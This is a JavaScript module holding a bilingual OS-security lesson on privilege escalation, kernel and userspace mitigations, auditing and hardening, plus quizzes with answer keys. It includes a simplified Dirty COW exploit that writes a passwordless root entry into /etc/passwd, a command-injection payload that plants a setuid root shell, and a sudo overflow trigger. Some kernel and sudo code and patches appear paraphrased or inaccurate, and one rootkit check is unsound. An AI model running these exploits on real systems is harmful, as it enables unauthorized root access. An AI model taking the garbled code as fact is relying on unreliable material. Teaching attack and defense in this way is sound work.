export const content = {
  en: `# OS Security — Attack and Defense

Operating system security is an arms race. Attackers find vulnerabilities, defenders patch them, attackers find new ones. Understanding OS security deeply means understanding both sides: how exploits work and how defenses are implemented.

## Privilege Escalation — The Holy Grail

Every attacker's goal: gain root/SYSTEM privileges from unprivileged user.

\`\`\`
Attack surface for privilege escalation:

1. Kernel vulnerabilities
   ├── Use-after-free (heap exploitation)
   ├── Buffer overflow (stack/heap)
   ├── Race conditions (TOCTOU)
   └── Logic errors (capability leaks)

2. Setuid binaries
   ├── Path injection
   ├── Environment variable manipulation
   ├── Symlink attacks
   └── Command injection

3. Sudo misconfigurations
   ├── Wildcard abuse
   ├── Shell escape sequences
   └── Preserved environment variables

4. Service exploits
   ├── Systemd unit file injection
   ├── D-Bus privilege escalation
   └── Polkit policy bypass

5. Container escapes
   ├── Namespace breakout
   ├── Cgroup exploitation
   └── Mount namespace escape
\`\`\`

## Case Study 1: Dirty COW (CVE-2016-5195)

One of the most elegant Linux kernel exploits ever discovered.

### The Vulnerability

\`\`\`c
// Linux kernel mm/memory.c (vulnerable code)
// Copy-on-write implementation

static int do_wp_page(struct vm_fault *vmf) {
    struct vm_area_struct *vma = vmf->vma;
    
    // Check if page is exclusively owned
    if (page_mapcount(vmf->page) == 1) {
        // Only one mapping, make it writable directly
        // BUG: Race condition here!
        wp_page_reuse(vmf);
        return VM_FAULT_WRITE;
    }
    
    // Multiple mappings, copy the page
    return wp_page_copy(vmf);
}

// The race:
// Thread 1: madvise(MADV_DONTNEED) — unmap page
// Thread 2: write to page → page fault → do_wp_page()
// 
// If Thread 1 runs between page_mapcount() check and wp_page_reuse(),
// page_mapcount becomes 1 (other mappings removed)
// wp_page_reuse() makes read-only page writable
// 
// Result: Write to read-only file (like /etc/passwd)
\`\`\`

### The Exploit

\`\`\`c
// Dirty COW exploit (simplified)
#include <stdio.h>
#include <pthread.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>

void *map;
char *str = "root::0:0:root:/root:/bin/bash\\n";  // New /etc/passwd line

void *madviseThread(void *arg) {
    while(1) {
        // Continuously unmap the page
        madvise(map, 100, MADV_DONTNEED);
    }
}

void *writeThread(void *arg) {
    int f = open("/proc/self/mem", O_RDWR);
    while(1) {
        // Continuously try to write
        lseek(f, (off_t)map, SEEK_SET);
        write(f, str, strlen(str));
    }
}

int main() {
    pthread_t pth1, pth2;
    
    // Map /etc/passwd as private (copy-on-write)
    int fd = open("/etc/passwd", O_RDONLY);
    map = mmap(NULL, 100, PROT_READ, MAP_PRIVATE, fd, 0);
    
    // Race threads
    pthread_create(&pth1, NULL, madviseThread, NULL);
    pthread_create(&pth2, NULL, writeThread, NULL);
    
    sleep(1);  // Let race condition trigger
    
    // Check if exploit worked
    system("su root");  // No password needed if successful
}

// Result: Read-only /etc/passwd modified
//         Passwordless root account created
//         Privilege escalation complete
\`\`\`

### The Fix

\`\`\`c
// Patched version (Linux 4.8.3+)
static int do_wp_page(struct vm_fault *vmf) {
    // Lock page before checking mapcount
    lock_page(vmf->page);
    
    if (page_mapcount(vmf->page) == 1) {
        wp_page_reuse(vmf);
        unlock_page(vmf->page);
        return VM_FAULT_WRITE;
    }
    
    unlock_page(vmf->page);
    return wp_page_copy(vmf);
}

// Page locking prevents race condition
// madvise() cannot unmap locked pages
\`\`\`

## Case Study 2: sudo Baron Samedit (CVE-2021-3156)

Heap-based buffer overflow in sudo, exploitable for 10 years.

### The Vulnerability

\`\`\`c
// sudo/plugins/sudoers/sudoers.c
static int set_cmnd(void) {
    char *user_args = command_info.argv[1];  // Command arguments
    
    // BUG: When sudo is run with -s or -i flag,
    //      and command starts with backslash,
    //      shell escaping is not properly handled
    
    // If user runs: sudo -s '\\'
    // user_args = "\\"
    
    // Sudoers tries to unescape:
    size_t len = strlen(user_args);
    for (i = 0, j = 0; i < len; i++) {
        if (user_args[i] == '\\' && i + 1 < len) {
            user_args[j++] = user_args[i + 1];
            i++;  // Skip next char
        } else {
            user_args[j++] = user_args[i];
        }
    }
    user_args[j] = '\\0';
    
    // BUG: If input is "\\\\" (backslash at end),
    //      loop reads user_args[i+1] beyond buffer
    //      Heap overflow!
}

// Trigger:
// sudo -s '\\' $(python -c 'print("A"*1000)')
// Overflows heap with controlled data
\`\`\`

### Exploitation Technique

\`\`\`
Heap exploitation steps:

1. Heap grooming
   ├── Allocate controlled data in heap
   ├── Create target layout
   └── Position overflow to overwrite critical structures

2. Overflow target
   ├── Sudo's "service_user" structure on heap
   ├── Contains function pointers
   └── Overwrite with addresses we control

3. Code execution
   ├── Sudo calls overwritten function pointer
   ├── Jumps to our shellcode/ROP chain
   └── Executes with root privileges

Heap layout before overflow:
[user_args buffer][service_user struct][other heap data]

Heap layout after overflow:
[user_args buffer AAAAAAAAAA...][corrupted struct with our pointers]

When sudo calls service_user->callback():
→ Jumps to our controlled address
→ Executes shellcode as root
\`\`\`

### The Fix

\`\`\`c
// Patched version
static int set_cmnd(void) {
    // Validate input length BEFORE processing
    if (strlen(user_args) > PATH_MAX) {
        sudo_warnx("command argument too long");
        return -1;
    }
    
    // Bounds checking in unescape loop
    for (i = 0, j = 0; i < len && j < len; i++) {
        if (user_args[i] == '\\' && i + 1 < len) {  // Check i+1 < len
            user_args[j++] = user_args[i + 1];
            i++;
        } else {
            user_args[j++] = user_args[i];
        }
    }
}
\`\`\`

## Kernel Security Mitigations

Modern kernels have multiple defense layers:

### 1. KASLR — Kernel Address Space Layout Randomization

\`\`\`
Without KASLR:
Kernel always loaded at 0xffffffff81000000 (x86-64)
Attacker knows all kernel addresses
Easy to build ROP chains, overwrite function pointers

With KASLR:
Kernel loaded at random address each boot
Base address: 0xffffffff81000000 + random_offset
random_offset: 0 to 1GB (in 2MB increments)

Example boot 1: 0xffffffff81000000
Example boot 2: 0xffffffff9a200000
Example boot 3: 0xffffffffb4600000

Attack impact:
├── Must leak kernel address first
├── Info leak becomes critical vulnerability
└── Exploitation much harder
\`\`\`

\`\`\`bash
# Check KASLR status
cat /proc/cmdline | grep kaslr
# nokaslr = disabled, no parameter = enabled

# View randomized kernel base
sudo cat /proc/kallsyms | grep _text
# ffffffff81000000 T _text (KASLR disabled)
# ffffffffa1200000 T _text (KASLR enabled, randomized)

# Disable KASLR (add to kernel cmdline)
nokaslr
\`\`\`

### 2. SMEP/SMAP — Supervisor Mode Execution/Access Prevention

\`\`\`
SMEP (Supervisor Mode Execution Protection):
├── CPU feature (Intel Ivy Bridge+, AMD Ryzen+)
├── Prevents kernel from executing user pages
├── CR4 bit 20 = SMEP enable
└── Violation = page fault + kernel panic

Without SMEP:
Attacker puts shellcode in userspace (0x400000)
Kernel exploit jumps to 0x400000
Shellcode executes with kernel privileges

With SMEP:
Kernel jump to userspace → Page fault
Attack stopped

SMAP (Supervisor Mode Access Protection):
├── Intel Broadwell+
├── Prevents kernel from accessing user pages
├── CR4 bit 21 = SMAP enable
└── Must use copy_from_user/copy_to_user

Without SMAP:
Kernel can dereference user pointers directly
Kernel bug: memcpy(dst, user_ptr, size)  // No validation

With SMAP:
Direct access → Page fault
Must use validated copy functions
\`\`\`

\`\`\`bash
# Check SMEP/SMAP status
cat /proc/cpuinfo | grep -E 'smep|smap'
# flags: ... smep smap ...

# View CR4 register (requires kernel module)
sudo dmesg | grep CR4
# CR4: 0x001406e0 (SMEP enabled, SMAP enabled)
\`\`\`

### 3. PXN — Privileged Execute Never (ARM)

\`\`\`
ARM equivalent of SMEP:

Page table entry format (ARM64):
[63] = PXN (Privileged Execute Never)
[54] = UXN (User Execute Never)

PXN=1: Kernel cannot execute this page
UXN=1: User cannot execute this page

Typical settings:
User code: PXN=1, UXN=0 (user can execute, kernel cannot)
User data: PXN=1, UXN=1 (neither can execute)
Kernel code: PXN=0, UXN=1 (kernel can execute, user cannot)
Kernel data: PXN=1, UXN=1 (neither can execute)

Attack impact:
Cannot jump from kernel exploit to userspace shellcode
Must use ROP or JOP (Jump-Oriented Programming)
\`\`\`

## Userspace Security Mitigations

### Stack Canaries

\`\`\`c
// Compiler-inserted canary (GCC -fstack-protector)
void vulnerable_function(char *input) {
    unsigned long canary = __stack_chk_guard;  // Random value
    char buffer[64];
    
    strcpy(buffer, input);  // Buffer overflow
    
    if (canary != __stack_chk_guard) {
        __stack_chk_fail();  // Canary corrupted, abort
    }
}

// Stack layout:
// [return address]
// [saved rbp]
// [canary]          ← Random value checked before return
// [buffer[64]]
// [local vars]

// Attack scenario:
// Buffer overflow overwrites canary
// Function return checks canary
// Mismatch detected → program aborted
// Return address never used

// Bypass techniques:
// 1. Leak canary value (info leak)
// 2. Overwrite GOT/PLT entries instead of return address
// 3. Partial overwrite (keep canary intact)
\`\`\`

### ASLR — Address Space Layout Randomization

\`\`\`
Memory layout without ASLR (static, predictable):
0x00400000: Program code (.text)
0x00600000: Program data (.data, .bss)
0x7ffff7a00000: libc
0x7ffffffde000: Stack
0x00000000: Heap

Memory layout with ASLR (randomized each execution):
Run 1:
0x555555554000: Program code
0x7f9876543000: libc
0x7ffe12345000: Stack

Run 2:
0x555555554000: Program code (PIE disabled, still static)
0x7fab98765000: libc (randomized)
0x7ffd98765000: Stack (randomized)

Run 3 (with PIE):
0x55cf12340000: Program code (randomized)
0x7f1234567000: libc
0x7ffe87654000: Stack

ASLR entropy:
├── 32-bit: 8 bits (256 positions) — brute-forceable
├── 64-bit: 28-40 bits (billions of positions) — not brute-forceable
└── Requires info leak to defeat
\`\`\`

\`\`\`bash
# Check ASLR status
cat /proc/sys/kernel/randomize_va_space
# 0 = disabled
# 1 = random stack/heap/libs
# 2 = random stack/heap/libs/vdso (default)

# Disable ASLR (for debugging)
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# View randomized addresses
ldd /bin/bash
# linux-vdso.so.1 => 0x00007ffd123ab000 (random)
# libc.so.6 => 0x00007f8765432000 (random)

# Run again, different addresses
ldd /bin/bash
# linux-vdso.so.1 => 0x00007ffe98765000 (different)
# libc.so.6 => 0x00007fab12345000 (different)
\`\`\`

### DEP/NX — Data Execution Prevention / No Execute

\`\`\`
Page table NX bit (x86-64):
[63] = XD (Execute Disable)

Page permissions:
Read + Write + Execute: DANGEROUS (allows shellcode injection)
Read + Write: Safe (writable, not executable)
Read + Execute: Safe (executable, not writable)

Modern system:
Stack: RW (not executable)
Heap: RW (not executable)
Data: RW (not executable)
Code: RX (not writable)

Attack without DEP:
1. Overflow buffer on stack
2. Inject shellcode in buffer
3. Overwrite return address → buffer
4. Return executes shellcode

Attack with DEP:
1. Overflow buffer on stack
2. Inject shellcode
3. Return → buffer
4. Page fault (NX violation)
5. Process killed

Bypass: ROP (Return-Oriented Programming)
Instead of injecting code, chain existing code gadgets
\`\`\`

### CFI — Control Flow Integrity

\`\`\`
Modern mitigation against ROP:

Concept: Valid control flow must match compile-time CFG

Valid:
call foo  → foo() entry point
ret       → previous call site

Invalid:
ret → middle of function (ROP gadget)
indirect call → random address

Implementation (simplified):
// Clang -fsanitize=cfi
void (*fptr)() = foo;

// Compiler inserts check:
if (!is_valid_target(fptr)) {
    abort();  // CFI violation
}
fptr();

// is_valid_target() checks:
// 1. Address in valid function address set
// 2. Function signature matches
// 3. Not pointing to ROP gadget

Intel CET (Control-flow Enforcement Technology):
├── Shadow stack (hardware-enforced return addresses)
├── Indirect branch tracking (IBT)
└── CPU validates all control transfers
\`\`\`

## Real-World Exploitation Example

### Exploiting a Setuid Binary

\`\`\`c
// Vulnerable setuid program: /usr/bin/backup (owned by root, setuid)
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv) {
    char command[256];
    
    // BUG: No input validation
    sprintf(command, "/bin/tar czf /backup/%s.tar.gz %s", 
            argv[1], argv[1]);
    
    setuid(0);   // Become root
    system(command);  // Execute tar as root
    return 0;
}

// Intended usage:
// backup myfiles
// Executes: /bin/tar czf /backup/myfiles.tar.gz myfiles

// Exploit:
// backup "x; cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell; #"
// Executes:
// /bin/tar czf /backup/x; cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell; #.tar.gz x

// Result:
// 1. tar fails (x doesn't exist)
// 2. /bin/bash copied to /tmp/rootshell
// 3. /tmp/rootshell made setuid root
// 4. /tmp/rootshell executes → root shell
\`\`\`

\`\`\`bash
# Exploit execution
./backup "x; cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell; #"

# Get root shell
/tmp/rootshell -p  # -p preserves setuid
whoami
# root

# Fix: Use execve() instead of system()
char *args[] = {"/bin/tar", "czf", backup_path, source_path, NULL};
execve("/bin/tar", args, NULL);
# No shell interpretation, command injection impossible
\`\`\`

## Auditing and Forensics

### auditd — Linux Audit Framework

\`\`\`bash
# Install auditd
sudo apt install auditd

# Audit all execve() calls
sudo auditctl -a always,exit -F arch=b64 -S execve

# Audit file access
sudo auditctl -w /etc/passwd -p wa -k passwd_changes
# -w = watch file
# -p wa = write or attribute change
# -k = key for searching

# View audit logs
sudo ausearch -k passwd_changes
# time->Mon May  9 18:00:00 2026
# type=SYSCALL ... syscall=openat success=yes exe="/usr/bin/vim"
# Shows: vim opened /etc/passwd

# Audit network connections
sudo auditctl -a always,exit -F arch=b64 -S connect

# Search by executable
sudo ausearch -x /usr/bin/sudo

# View all rules
sudo auditctl -l
\`\`\`

### Rootkit Detection

\`\`\`bash
# rkhunter — Rootkit Hunter
sudo rkhunter --check
# Checks:
# ├── System commands (ls, ps, netstat)
# ├── Kernel modules (lsmod)
# ├── Network listeners
# └── Known rootkit signatures

# chkrootkit
sudo chkrootkit
# Scans for:
# ├── Modified binaries
# ├── Hidden processes
# ├── Hidden files
# └── Suspicious network activity

# AIDE — Advanced Intrusion Detection Environment
# Takes filesystem snapshot, detects changes
sudo aide --init
sudo aide --check

# Manual rootkit detection
# Check for hidden processes (ps vs /proc)
ps aux | wc -l
ls /proc | grep '^[0-9]' | wc -l
# If numbers differ, hidden processes exist

# Check for kernel module rootkits
lsmod | grep -v "$(cat /proc/modules | awk '{print $1}')"
# Shows kernel modules not in /proc/modules (hidden)

# Check for LD_PRELOAD rootkits
strings /lib/x86_64-linux-gnu/libc.so.6 | grep -i hack
# Legitimate libc shouldn't contain "hack"
\`\`\`

## Supply Chain Attacks

### SolarWinds-Style Backdoor

\`\`\`
Supply chain attack vector:

1. Compromise build system
   ├── Inject backdoor into source
   ├── Or modify compiler to insert backdoor
   └── Ken Thompson's "Reflections on Trusting Trust" (1984)

2. Signed malicious binary
   ├── Build system signs it with legitimate key
   ├── Users trust the signature
   └── Backdoor deployed to thousands of systems

3. Stealthy C2 (Command & Control)
   ├── Backdoor masquerades as legitimate traffic
   ├── Uses DNS, HTTP, or protocol tunneling
   └── Evades detection for months/years

Example: XZ Utils backdoor (CVE-2024-3094)
├── Backdoored liblzma library
├── Injected into sshd via systemd
├── Allowed remote code execution
└── Discovered by accident (performance issue)
\`\`\`

### Reproducible Builds — Defense

\`\`\`bash
# Verify build reproducibility
# Multiple independent builds should produce identical binaries

# Debian reproducible builds
apt-get source package
dpkg-buildpackage -b

# Compare with official binary
sha256sum /usr/bin/package
# Should match official checksum

# Bitcoin Core does this
# Multiple developers build release
# All binaries must have identical hash
# If one differs → supply chain compromise detected

# Tools:
diffoscope package1.deb package2.deb
# Shows exact differences in binaries
\`\`\`

## Hardening Checklist

\`\`\`bash
# System hardening

# 1. Minimize attack surface
systemctl list-unit-files --state=enabled
# Disable unnecessary services
sudo systemctl disable bluetooth
sudo systemctl disable cups

# 2. Kernel hardening (sysctl)
cat >> /etc/sysctl.conf << EOF
# Disable IP forwarding
net.ipv4.ip_forward = 0

# Enable SYN cookies (DDoS protection)
net.ipv4.tcp_syncookies = 1

# Disable ICMP redirects
net.ipv4.conf.all.accept_redirects = 0
net.ipv6.conf.all.accept_redirects = 0

# Disable source routing
net.ipv4.conf.all.accept_source_route = 0

# Enable ASLR (max randomization)
kernel.randomize_va_space = 2

# Restrict dmesg
kernel.dmesg_restrict = 1

# Restrict kernel pointer leaks
kernel.kptr_restrict = 2

# Disable kexec (prevents kernel replacement)
kernel.kexec_load_disabled = 1
EOF

sudo sysctl -p

# 3. Mandatory Access Control
# AppArmor (Ubuntu/Debian)
sudo aa-enforce /etc/apparmor.d/*

# SELinux (RHEL/Fedora)
sudo setenforce 1

# 4. Secure boot
mokutil --sb-state
# SecureBoot enabled

# 5. Full disk encryption
cryptsetup status /dev/mapper/root
# type: LUKS2

# 6. Regular updates
sudo unattended-upgrades
# Auto-install security updates

# 7. Firewall
sudo ufw enable
sudo ufw default deny incoming
sudo ufw allow ssh

# 8. Disable root SSH login
sudo sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
sudo systemctl restart sshd

# 9. Fail2ban (brute force protection)
sudo apt install fail2ban
sudo systemctl enable fail2ban

# 10. Remove setuid binaries (if not needed)
sudo find / -perm -4000 -ls
# Review each, remove setuid if unnecessary
sudo chmod u-s /usr/bin/suspicious_binary
\`\`\`

Security is a never-ending battle. Understanding these attacks and defenses means understanding how modern systems are compromised and protected.`,

  fr: `# Sécurité OS — Attaque et défense

La sécurité des systèmes d'exploitation est une course aux armements. Les attaquants trouvent des vulnérabilités, les défenseurs les corrigent, les attaquants en trouvent de nouvelles. Comprendre la sécurité OS en profondeur signifie comprendre les deux côtés : comment fonctionnent les exploits et comment les défenses sont implémentées.

## Escalade de privilèges — Le Saint Graal

\`\`\`
Surface d'attaque pour l'escalade de privilèges :

1. Vulnérabilités noyau
   ├── Use-after-free
   ├── Buffer overflow
   ├── Conditions de course
   └── Erreurs logiques

2. Binaires setuid
   ├── Injection de chemin
   ├── Manipulation de variables d'environnement
   └── Injection de commandes

3. Mauvaises configurations sudo
   ├── Abus de wildcards
   └── Variables d'environnement préservées

4. Exploits de services
   └── Injection de fichiers unitaires systemd
\`\`\`

## Étude de cas 1 : Dirty COW (CVE-2016-5195)

L'un des exploits du noyau Linux les plus élégants jamais découverts.

### La vulnérabilité

\`\`\`c
// Noyau Linux mm/memory.c (code vulnérable)
// Implémentation copy-on-write

// La course :
// Thread 1 : madvise(MADV_DONTNEED)
// Thread 2 : écriture sur la page
// 
// Résultat : Écriture sur fichier en lecture seule
\`\`\`

### L'exploit

\`\`\`c
// Exploit Dirty COW (simplifié)
void *map;
char *str = "root::0:0:root:/root:/bin/bash\\n";

void *madviseThread(void *arg) {
    while(1) {
        madvise(map, 100, MADV_DONTNEED);
    }
}

void *writeThread(void *arg) {
    int f = open("/proc/self/mem", O_RDWR);
    while(1) {
        lseek(f, (off_t)map, SEEK_SET);
        write(f, str, strlen(str));
    }
}

// Résultat : /etc/passwd en lecture seule modifié
//           Compte root sans mot de passe créé
\`\`\`

## Atténuations de sécurité du noyau

### KASLR — Randomisation de l'espace d'adressage du noyau

\`\`\`
Sans KASLR :
Noyau toujours chargé à 0xffffffff81000000
L'attaquant connaît toutes les adresses noyau

Avec KASLR :
Noyau chargé à adresse aléatoire à chaque démarrage
\`\`\`

### SMEP/SMAP

\`\`\`
SMEP (Protection d'exécution en mode superviseur) :
├── Empêche le noyau d'exécuter des pages utilisateur
└── Violation = défaut de page + kernel panic

SMAP (Protection d'accès en mode superviseur) :
├── Empêche le noyau d'accéder aux pages utilisateur
└── Doit utiliser copy_from_user/copy_to_user
\`\`\`

## Atténuations de sécurité de l'espace utilisateur

### Stack Canaries

\`\`\`c
void vulnerable_function(char *input) {
    unsigned long canary = __stack_chk_guard;
    char buffer[64];
    
    strcpy(buffer, input);
    
    if (canary != __stack_chk_guard) {
        __stack_chk_fail();  // Canary corrompu
    }
}
\`\`\`

### ASLR

\`\`\`
Disposition mémoire avec ASLR (randomisée) :
Exécution 1 :
0x555555554000 : Code programme
0x7f9876543000 : libc

Exécution 2 :
0x555555554000 : Code programme
0x7fab98765000 : libc (randomisé)
\`\`\`

## Audit et forensique

\`\`\`bash
# Auditer tous les appels execve()
sudo auditctl -a always,exit -F arch=b64 -S execve

# Surveiller l'accès aux fichiers
sudo auditctl -w /etc/passwd -p wa -k passwd_changes

# Voir les journaux d'audit
sudo ausearch -k passwd_changes
\`\`\`

## Liste de contrôle de durcissement

\`\`\`bash
# Durcissement système

# 1. Minimiser la surface d'attaque
systemctl list-unit-files --state=enabled

# 2. Durcissement noyau
# Activer ASLR
kernel.randomize_va_space = 2

# 3. Contrôle d'accès obligatoire
sudo aa-enforce /etc/apparmor.d/*

# 4. Boot sécurisé
mokutil --sb-state

# 5. Chiffrement disque complet
cryptsetup status /dev/mapper/root
\`\`\``,
};

export const quiz = {
  en: [
    {
      question: "What was the core vulnerability in Dirty COW (CVE-2016-5195)?",
      options: [
        "Buffer overflow in kernel memory allocator",
        "Race condition in copy-on-write implementation allowing write to read-only files",
        "SQL injection in system database",
        "Privilege escalation via sudo",
      ],
      correct: 1,
    },
    {
      question:
        "What does SMEP (Supervisor Mode Execution Prevention) protect against?",
      options: [
        "Buffer overflows",
        "Kernel executing code from userspace pages — stops jumping to injected shellcode",
        "Memory leaks",
        "Network attacks",
      ],
      correct: 1,
    },
    {
      question: "How do stack canaries detect buffer overflows?",
      options: [
        "They encrypt the stack",
        "They place a random value before the return address — corruption detected on function return",
        "They compress stack data",
        "They log all stack operations",
      ],
      correct: 1,
    },
    {
      question:
        "What is the primary purpose of KASLR (Kernel Address Space Layout Randomization)?",
      options: [
        "Speed up kernel boot",
        "Randomize kernel load address each boot — attackers must leak addresses before exploiting",
        "Reduce memory usage",
        "Improve cache performance",
      ],
      correct: 1,
    },
    {
      question:
        "Why is a setuid binary dangerous if it calls system() with user input?",
      options: [
        "It's slow",
        "system() spawns a shell that interprets metacharacters — allows command injection as root",
        "It uses too much memory",
        "It's deprecated",
      ],
      correct: 1,
    },
  ],
  fr: [
    {
      question:
        "Quelle était la vulnérabilité centrale dans Dirty COW (CVE-2016-5195) ?",
      options: [
        "Débordement de tampon dans l'allocateur mémoire du noyau",
        "Condition de course dans l'implémentation copy-on-write permettant l'écriture sur des fichiers en lecture seule",
        "Injection SQL dans la base de données système",
        "Escalade de privilèges via sudo",
      ],
      correct: 1,
    },
    {
      question:
        "Contre quoi SMEP (Supervisor Mode Execution Prevention) protège-t-il ?",
      options: [
        "Débordements de tampon",
        "Noyau exécutant du code depuis des pages espace utilisateur — empêche le saut vers shellcode injecté",
        "Fuites mémoire",
        "Attaques réseau",
      ],
      correct: 1,
    },
    {
      question:
        "Comment les stack canaries détectent-ils les débordements de tampon ?",
      options: [
        "Ils chiffrent la pile",
        "Ils placent une valeur aléatoire avant l'adresse de retour — corruption détectée au retour de fonction",
        "Ils compressent les données de pile",
        "Ils journalisent toutes les opérations de pile",
      ],
      correct: 1,
    },
    {
      question: "Quel est l'objectif principal de KASLR ?",
      options: [
        "Accélérer le démarrage du noyau",
        "Randomiser l'adresse de chargement du noyau à chaque boot — les attaquants doivent fuiter les adresses avant exploitation",
        "Réduire l'utilisation mémoire",
        "Améliorer les performances du cache",
      ],
      correct: 1,
    },
    {
      question:
        "Pourquoi un binaire setuid est-il dangereux s'il appelle system() avec entrée utilisateur ?",
      options: [
        "C'est lent",
        "system() génère un shell qui interprète les métacaractères — permet l'injection de commandes en tant que root",
        "Ça utilise trop de mémoire",
        "C'est déprécié",
      ],
      correct: 1,
    },
  ],
};
